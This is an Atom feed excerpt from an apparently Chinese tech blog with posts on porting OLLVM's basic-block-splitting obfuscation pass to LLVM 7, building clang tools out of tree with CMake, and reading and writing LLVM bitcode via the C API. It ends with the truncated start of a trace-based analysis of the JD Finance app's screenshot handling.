    <id>https://f4ncy.top/2019/03/22/rebuildpass/</id>
    <published>2019-03-21T16:00:00.000Z</published>
    <updated>2019-03-24T08:57:39.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="移植OLLVM混淆pass"><a href="#移植OLLVM混淆pass" class="headerlink" title="移植OLLVM混淆pass"></a>移植OLLVM混淆pass</h1><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>仅仅是学习混淆pass的编写，改动不是很大。将OLLVM的pass放进新版本（7.0.0 release）的LLVM源码下进行编译。<br>OLLVM的pass目录：<code>OLLVM/lib/Transforms/Obfuscation</code></p><p>控制流平坦化：Flattening.cpp<br>虚假控制流：BogusControlFlow.cpp SplitBasicBlocks.cpp<br>指令替换：Substitution.cpp</p><p>对应头文件目录：<code>OLLVM/include/llvm/Transforms/Obfuscation</code></p><p>这里以分割基本块的pass为例，将<br>SplitBasicBlocks.cpp SplitBasicBlocks.h<br>Utils.cpp Utils.h<br>CryptoUtils.h(include/llvm/)<br>复制到对应目录。</p><p>修改对应目录下的LLVMBuild.txt，subdirectories添加模块目录名称。修改对应目录下（Obfuscation目录下和Transforms目录下）的CMakeLists.txt，add_llvm_library添加模块名称和参与编译文件，add_dependencies添加模块名称。此时进行编译就可以看到build/lib目录下已经有libLLVMObfus.a（我把OLLVM里的Obfuscation改成了Obfus）。<br>但是此时运行opt，发现无<code>-split</code>参数。</p><p>所以我们还需要修改IPO（Transforms/IPO），加入PassManager之后可以直接通过clang的参数使用pass了<br>PassManagerBuilder.cpp：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">45</span>      <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Transforms/Obfus/Split.h&quot;</span></span></span><br><span class="line">+<span class="number">158</span>     <span class="function"><span class="keyword">static</span> cl::opt&lt;<span class="keyword">bool</span>&gt; <span class="title">Split</span><span class="params">(<span class="string">&quot;split&quot;</span>, cl::init(<span class="literal">false</span>),cl::desc(<span class="string">&quot;Enable basic block splitting&quot;</span>))</span></span>;</span><br><span class="line">+<span class="number">433</span>     MPM.<span class="built_in">add</span>(<span class="built_in">createSplitBasicBlock</span>(Split));</span><br></pre></td></tr></table></figure><p>IPO的LLVMBuild.txt：<br><code>+required_libraries=Obfus</code></p><p>ok，此时编译完成后，opt参数列表里就有了<code>-split</code>。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>split PASS的实现：</p><ul><li><p>保存Function的所有Block；</p></li><li><p>逐个处理Block，对非单一指令BB和不包含PHI指令的BB进行分割；</p></li><li><p>生成乱序表；</p></li><li><p>乱序处理Block中的指令；</p></li><li><p>具体处理单个指令的方法：<br><code>*BasicBlock-&gt;splitBasicBlock(BasicBlock::iterator,*BasicBlock-&gt;getName()+&quot;.splist&quot;)</code><br>位于<code>OLLVM/lib/IR/BasicBlock.cpp</code></p><blockquote><p>在指定的指令处将一个基本块一分为二。注意所有在指定指令前的指令会作为原始基本块的一部分,一个无条件分支会被添加到新的BB，余下的指令会被移到新的BB，包括旧BB的终止符。这会使迭代器无效。<br>注意这只针对一下格式合格的BB（有头有尾），并且指定的指令不允许是指令列表的最后一个（会导致生成一个退化的BB，而且内部带终止符）。</p></blockquote></li><li><p>新建一个BB，将指定指令移到新的BB，为新BB添加分支指令；</p></li><li><p>遍历新block的后继block，更新所有PHI节点信息，将原来从旧block出来的分支路径改为从新block出来。</p></li></ul><p>判断PHI节点：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (BasicBlock::iterator II = Successor-&gt;<span class="built_in">begin</span>();</span><br><span class="line">         (PN = dyn_cast&lt;PHINode&gt;(II)); ++II) &#123;</span><br><span class="line">      <span class="keyword">int</span> IDX = PN-&gt;<span class="built_in">getBasicBlockIndex</span>(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">while</span> (IDX != <span class="number">-1</span>) &#123;</span><br><span class="line">        PN-&gt;<span class="built_in">setIncomingBlock</span>((<span class="keyword">unsigned</span>)IDX, New);</span><br><span class="line">        IDX = PN-&gt;<span class="built_in">getBasicBlockIndex</span>(<span class="keyword">this</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里添加几条打印信息代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#++ <span class="number">88</span> </span><br><span class="line"><span class="built_in">errs</span>()&lt;&lt;<span class="string">&quot;This BB size: &quot;</span>&lt;&lt;curr-&gt;<span class="built_in">size</span>()&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">#++ <span class="number">114</span> </span><br><span class="line"><span class="built_in">errs</span>()&lt;&lt;<span class="string">&quot;To split instruction: &quot;</span>&lt;&lt;*it&lt;&lt;<span class="string">&quot;\n&quot;</span>;   </span><br><span class="line">#++ <span class="number">125</span> </span><br><span class="line"><span class="built_in">errs</span>()&lt;&lt;<span class="string">&quot;After split: \n&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(BasicBlock::iterator sptit = toSplit-&gt;<span class="built_in">begin</span>();sptit!=toSplit-&gt;<span class="built_in">end</span>();++sptit)&#123;</span><br><span class="line">    <span class="built_in">errs</span>()&lt;&lt;<span class="string">&quot;[+] &quot;</span>&lt;&lt;*sptit&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">errs</span>()&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>打印出对BB的分割点。</p><p>对比pass效果<br><code>./clang -save-temps -S -mllvm -split test.c -o test.s</code><br>拿到的是pass处理的汇编文件，和中间文件。<br>对test.bc-&gt;test.ll-&gt;test.s(得到未经过pass处理的汇编文件)，可自行对比（处理的BB会被添上“.split”）。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>在源代码目录外编译clang例子</title>
    <link href="https://f4ncy.top/2019/02/28/buildexample/"/>
    <id>https://f4ncy.top/2019/02/28/buildexample/</id>
    <published>2019-02-28T08:00:00.000Z</published>
    <updated>2019-02-28T10:35:09.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="在源代码目录外编译clang例子"><a href="#在源代码目录外编译clang例子" class="headerlink" title="在源代码目录外编译clang例子"></a>在源代码目录外编译clang例子</h1><p>之前bitcode读写的例子编译一直报错，CMakeLists.txt改的面目全非，搜索过程中找到一个llvm工具编译的通用模版。</p><h2 id="如何为独立的clang-tool编写CMakeLists-txt"><a href="#如何为独立的clang-tool编写CMakeLists-txt" class="headerlink" title="如何为独立的clang tool编写CMakeLists.txt"></a>如何为独立的clang tool编写CMakeLists.txt</h2><p><code>cmake -DCMAKE_EXPORT_COMPILE_COMMANDS=ON -DCMAKE_PREFIX_PATH=/Users/fancy/Documents/LLVM/build/ </code></p><p>DCMAKE_PREFIX_PATH指定你的llvm编译生成目录</p><p>CMakeLists.txt:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">cmake_minimum_required(VERSION 3.4.3)</span><br><span class="line"></span><br><span class="line">set(CMAKE_CONFIGURATION_TYPES &quot;Debug;Release&quot; CACHE STRING &quot;Configs&quot; FORCE)</span><br><span class="line">set(CMAKE_SUPPRESS_REGENERATION TRUE)</span><br><span class="line"></span><br><span class="line">############################################################</span><br><span class="line">#   setting Project informations</span><br><span class="line">############################################################</span><br><span class="line"></span><br><span class="line">set(PROJECT_NAME &quot;llvm_bc_parsing_example&quot;)</span><br><span class="line"></span><br><span class="line">set(LIBRARY_LIST )</span><br><span class="line">set(LIBRARY_LIST $&#123;LIBRARY_LIST&#125;   )</span><br><span class="line">set(COMPONENT_LIST mcparser bitwriter bitreader support mc option )</span><br><span class="line"></span><br><span class="line">############################################################</span><br><span class="line">#   generate makefiles</span><br><span class="line">############################################################</span><br><span class="line"></span><br><span class="line">project($&#123;PROJECT_NAME&#125;)</span><br><span class="line"></span><br><span class="line">find_package(LLVM REQUIRED CONFIG)</span><br><span class="line">message(STATUS &quot;Found LLVM $&#123;LLVM_PACKAGE_VERSION&#125;&quot;)</span><br><span class="line">message(STATUS &quot;Using LLVMConfig.cmake in: $&#123;LLVM_DIR&#125;&quot;)</span><br><span class="line"></span><br><span class="line">include_directories($&#123;LLVM_INCLUDE_DIRS&#125;)</span><br><span class="line">if(LLVM_BUILD_MAIN_SRC_DIR)</span><br><span class="line">  include_directories($&#123;LLVM_BUILD_MAIN_SRC_DIR&#125;/tools/clang/include)</span><br><span class="line">  include_directories($&#123;LLVM_BUILD_BINARY_DIR&#125;/tools/clang/include)</span><br><span class="line">endif()</span><br><span class="line">link_directories($&#123;LLVM_LIBRARY_DIRS&#125;)</span><br><span class="line">add_definitions($&#123;LLVM_DEFINITIONS&#125;)</span><br><span class="line"></span><br><span class="line">add_executable($&#123;PROJECT_NAME&#125; main.c)</span><br><span class="line"></span><br><span class="line">if (&quot;$&#123;CMAKE_CXX_COMPILER_ID&#125;&quot; STREQUAL &quot;MSVC&quot;)</span><br><span class="line">  foreach(link_lib IN LISTS LIBRARY_LIST)</span><br><span class="line">    target_link_libraries($&#123;PROJECT_NAME&#125; optimized $&#123;link_lib&#125;)</span><br><span class="line">    target_link_libraries($&#123;PROJECT_NAME&#125; debug     $&#123;link_lib&#125;d)</span><br><span class="line">  endforeach()</span><br><span class="line">else()</span><br><span class="line">  target_link_libraries($&#123;PROJECT_NAME&#125; $&#123;LIBRARY_LIST&#125;)</span><br><span class="line">  set(CMAKE_CXX_FLAGS &quot;-std=c99 -Wno-unused-parameter -fno-strict-aliasing -Weverything -Wno-switch-enum&quot;)</span><br><span class="line">  #set(CMAKE_EXE_LINKER_FLAGS &quot;-static -static-libgcc -static-libstdc++&quot;)</span><br><span class="line">endif()</span><br><span class="line"></span><br><span class="line">llvm_map_components_to_libnames(llvm_libs $&#123;COMPONENT_LIST&#125;)</span><br><span class="line">target_link_libraries($&#123;PROJECT_NAME&#125; $&#123;llvm_libs&#125;)</span><br><span class="line"></span><br><span class="line">message(STATUS &quot;User selected librarys = $&#123;LIBRARY_LIST&#125;&quot;)</span><br><span class="line">message(STATUS &quot;User selected components = $&#123;COMPONENT_LIST&#125;&quot;)</span><br><span class="line">message(STATUS &quot;    = $&#123;llvm_libs&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>COMPONENT_LIST添加你的代码需要的库名称（模块名就行，不需要完整的文件名）</p><p><a href="https://heejune.me/2016/08/17/build-your-own-clang-example-outside-of-the-llvm-source-tree/">https://heejune.me/2016/08/17/build-your-own-clang-example-outside-of-the-llvm-source-tree/</a></p><p><a href="https://qiita.com/Chironian/items/8770c8ab833086fb51a9#328cmakeliststxt%E3%81%BE%E3%81%A8%E3%82%81">https://qiita.com/Chironian/items/8770c8ab833086fb51a9#328cmakeliststxt%E3%81%BE%E3%81%A8%E3%82%81</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>如何读写LLVM bitcode</title>
    <link href="https://f4ncy.top/2019/02/27/RWBitcode/"/>
    <id>https://f4ncy.top/2019/02/27/RWBitcode/</id>
    <published>2019-02-27T08:00:00.000Z</published>
    <updated>2019-03-22T02:19:37.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="如何读写LLVM-bitcode"><a href="#如何读写LLVM-bitcode" class="headerlink" title="如何读写LLVM bitcode"></a>如何读写LLVM bitcode</h1><p>翻译转载</p><p>我已经阅读了社交媒体上的多篇帖子，现在抱怨LLVM有多可怕。<br>存储库太大以至于无法获得有用的信息，每天经常有数百次提交，邮件列表几乎不可能跟踪，现在可执行的可执行文件高达40Mb …</p><p>将那些花絮放在一边 - 一旦你掌握了这头巨兽，LLVM就非常容易使用了。<br>为了帮助人们使用LLVM，我想我会把你会用LLVM做的琐碎的操作示例放在一起 - 解析一个LLVM的中间表示文件（称为bitcode，文件扩展名.bc），然后再写回来。</p><p>首先，我们浏览一些高级LLVM术语：</p><ul><li>对于用户代码来说LLVM的主要抽象对象是Module。它是一个包含所有函数，全局变量，以及你或用户编写的代码指令的类。</li><li>Bitcode文件实际上是LLVM Module的序列化，以便可以在一个不同的程序中重组。</li><li>LLVM实验MemoryBuffer 对象来处理来自文件、标准输入或数组的数据</li></ul><p>以我的例子，我将使用LLVM C API - 一个比LLVM内核C++头文件更稳定的抽象。如果你希望使用多个版本的LLVM代码，那么C API非常有用，他比LLVM C++头文件更稳定。（另外，我将LLVM广泛用于我的工作，几乎每周都会有一些LLVM C++头文件被更改以破坏我们的代码。而C API从来不会。）</p><p>这里，我将假设你已经启动了LLVM，构建完并安装了它。像这样执行一下简单的步骤：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://git.llvm.org/git/llvm.git &lt;llvm dir&gt;</span><br><span class="line">cd &lt;llvm dir&gt;</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=RELEASE -DCMAKE_INSTALL_PREFIX=install ..</span><br><span class="line">cmake --build . --target install</span><br></pre></td></tr></table></figure><p>以上步骤完成后，你将会得到一个安装在/build/install下的LLVM</p><p>至此，对于一些小可执行文件我使用了CMake。CMake是目前为止结合LLVM的最简单的方法，LLVM也使用它作为自己的构建系统。</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">project</span>(llvm_bc_parsing_example)</span><br><span class="line"><span class="keyword">cmake_minimum_required</span>(VERSION <span class="number">3.4</span>.<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># option to allow a user to specify where an LLVM install is on the system</span></span><br><span class="line"><span class="keyword">set</span>(LLVM_INSTALL_DIR <span class="string">&quot;&quot;</span> CACHE <span class="keyword">STRING</span> <span class="string">&quot;An LLVM install directory.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;$&#123;LLVM_INSTALL_DIR&#125;&quot;</span> <span class="keyword">STREQUAL</span> <span class="string">&quot;&quot;</span>)</span><br><span class="line">  <span class="keyword">message</span>(FATAL_ERROR <span class="string">&quot;LLVM_INSTALL_DIR not set! Set it to the location of an LLVM install.&quot;</span>)</span><br><span class="line"><span class="keyword">endif</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># fixup paths to only use the Linux convention</span></span><br><span class="line"><span class="keyword">string</span>(REPLACE <span class="string">&quot;\\&quot;</span> <span class="string">&quot;/&quot;</span> LLVM_INSTALL_DIR <span class="variable">$&#123;LLVM_INSTALL_DIR&#125;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tell CMake where LLVM&#x27;s module is</span></span><br><span class="line"><span class="keyword">list</span>(APPEND CMAKE_MODULE_PATH <span class="variable">$&#123;LLVM_INSTALL_DIR&#125;</span>/lib/cmake/llvm)</span><br><span class="line"></span><br><span class="line"><span class="comment"># include LLVM</span></span><br><span class="line"><span class="keyword">include</span>(LLVMConfig)</span><br><span class="line"></span><br><span class="line"><span class="keyword">add_executable</span>(llvm_bc_parsing_example main.c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_include_directories</span>(llvm_bc_parsing_example PUBLIC <span class="variable">$&#123;LLVM_INCLUDE_DIRS&#125;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_link_libraries</span>(llvm_bc_parsing_example PUBLIC LLVMBitReader LLVMBitWriter)</span><br></pre></td></tr></table></figure><p>所以现在我们已经完成了CMake的设置，我们可以使用现有的LLVM安装，现在我们可以开始使用我们的实际C代码了！<br>因此，要使用LLVM C API，主要需要一个头文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;llvm-c/Core.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>我们需要两个额外的头文件来执行bitcode的读写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;llvm-c/BitReader.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;llvm-c/BitWriter.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>现在我们开始我们主要实现的功能，假设使用2个命令行参数，第一个是输入文件，第二个是输出文件。如果一个接收到以‘-’为文件名的参数，这意味着从标准输入读取或向标准输出写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="number">3</span> != argc)&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Invalid command line!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> inputFilename = argv[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> outputFilename = argv[<span class="number">2</span>];</span><br></pre></td></tr></table></figure><p>所以首先我们扫描输入文件。我们将从其他输入或一个文件名得到一个LLVM内存缓冲对象：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">LLVMMemoryBufferRef memoryBuffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if we are to read our input file from stdin</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="string">&#x27;-&#x27;</span> == inputFilename[<span class="number">0</span>]) &amp;&amp; (<span class="string">&#x27;\0&#x27;</span> == inputFilename[<span class="number">1</span>])) &#123;</span><br><span class="line">  <span class="keyword">char</span> *message;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> != LLVMCreateMemoryBufferWithSTDIN(&amp;memoryBuffer, &amp;message)) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>, message);</span><br><span class="line">    <span class="built_in">free</span>(message);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">char</span> *message;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> != LLVMCreateMemoryBufferWithContentsOfFile(</span><br><span class="line">               inputFilename, &amp;memoryBuffer, &amp;message)) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>, message);</span><br><span class="line">    <span class="built_in">free</span>(message);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行完这些代码后，memoryBuffer就可以读取我们的bitcode文件转为LLVM module。现在我们创建module</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// now create our module using the memory buffer</span></span><br><span class="line">LLVMModuleRef <span class="keyword">module</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != LLVMParseBitcode2(memoryBuffer, &amp;<span class="keyword">module</span>)) &#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Invalid bitcode detected!\n&quot;</span>);</span><br><span class="line">  LLVMDisposeMemoryBuffer(memoryBuffer);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// done with the memory buffer now, so dispose of it</span></span><br><span class="line">LLVMDisposeMemoryBuffer(memoryBuffer);</span><br></pre></td></tr></table></figure><p>一旦我们得到module，我们不再需要memory buffer了，我们直接释放这部分内存。我们设法获取了一个LLVM bitcode文件，将其反序列化为一个LLVM module，之后就可以随你操作了。因此假设你已经使用LLVM module完成了所有操作了，并希望写回bitcode文件.</p><p>方法和读取方法正交，我们寻找特殊文件名‘-’做相应处理：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// check if we are to write our output file to stdout</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="string">&#x27;-&#x27;</span> == outputFilename[<span class="number">0</span>]) &amp;&amp; (<span class="string">&#x27;\0&#x27;</span> == outputFilename[<span class="number">1</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> != LLVMWriteBitcodeToFD(<span class="keyword">module</span>, STDOUT_FILENO, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to write bitcode to stdout!\n&quot;</span>);</span><br><span class="line">    LLVMDisposeModule(<span class="keyword">module</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> != LLVMWriteBitcodeToFile(<span class="keyword">module</span>, outputFilename)) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to write bitcode to file!\n&quot;</span>);</span><br><span class="line">    LLVMDisposeModule(<span class="keyword">module</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后我们需要对内存清理，删除module：<br><code>LLVMDisposeModule(module);</code></p><p>我们现在就可以扫描并输出一个LLVM bitcode文件。<br><a href="https://github.com/sheredom/llvm_bc_parsing_example">GitHub Example</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/assets/css/DPlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/DPlayer.min.js&quot;&gt; &lt;/script&gt;&lt;script src=&quot;/as
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>京东“盗图”事件分析</title>
    <link href="https://f4ncy.top/2019/02/27/jdanalysis/"/>
    <id>https://f4ncy.top/2019/02/27/jdanalysis/</id>
    <published>2019-02-27T02:41:40.000Z</published>
    <updated>2019-02-27T02:45:38.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><h1 id="京东“盗图”事件分析"><a href="#京东“盗图”事件分析" class="headerlink" title="京东“盗图”事件分析"></a>京东“盗图”事件分析</h1><p>这里还是利用上次讲的trace来宏观分析函数调用流。</p><p>利用ddms的trace功能，记录用户截图时，“京东金融app”在后台执行的函数流：<br><img src="/2019/02/27/jdanalysis/15512338044303.jpg" alt="w500"></p><p>涉及函数和截图有关，尝试搜索“screenshot”：<br><img src="/2019/02/27/jdanalysis/15512338738873.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512338842904.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512338942294.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512339034349.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512339165953.jpg" alt="w500"></p><p>这里省略了一些方法，主要涉及两个类：GlobalShotListener和ScreenShotListenManager</p><p>先看ScreenShotListenManager：<br><img src="/2019/02/27/jdanalysis/15512339408059.jpg" alt="w600"><br>注册全局的媒体内容观察者。响应函数：</p><p><img src="/2019/02/27/jdanalysis/15512339976224.jpg" alt="w400"><br>打印了一些截图信息，交给监听类处理:</p><p><img src="/2019/02/27/jdanalysis/15512340746782.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512341339635.jpg" alt="w500"><br>设置的监听响应对象是GlobalShotListener的实例。</p><p>看一下GlobalShotListener：</p><p><img src="/2019/02/27/jdanalysis/15512341701005.jpg" alt="w400"><br>响应函数调用gainShotBusinessItemGet</p><p><img src="/2019/02/27/jdanalysis/15512341886179.jpg" alt="w500"></p><p><img src="/2019/02/27/jdanalysis/15512342068041.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512342154699.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512342219927.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512342390445.jpg" alt="w600"></p><p><img src="/2019/02/27/jdanalysis/15512342910972.jpg" alt="w500"><br>generateKey是由图片信息组成的类似文件名的特征字符串。<br>根据特征字符串在缓存文件中检索指定文件。</p><p><img src="/2019/02/27/jdanalysis/15512342982748.jpg" alt="w500"><br><img src="/2019/02/27/jdanalysis/15512343179085.jpg" alt="w600"><br><img src="/2019/02/27/jdanalysis/15512343262746.jpg" 